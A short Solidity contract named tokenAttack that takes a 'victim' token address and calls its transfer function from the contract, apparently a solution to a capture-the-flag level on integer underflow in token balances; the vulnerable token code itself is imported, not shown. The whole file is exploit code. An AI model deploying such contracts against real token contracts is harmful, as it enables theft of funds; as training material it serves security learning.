// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './token.sol';

contract tokenAttack {
    Token public token;

    constructor(address _victimAddress) public {
        token = Token(_victimAddress);
    }

    function letsgetit(address _recipient, uint _amount) public {
        token.transfer(_recipient, _amount);
    }
}
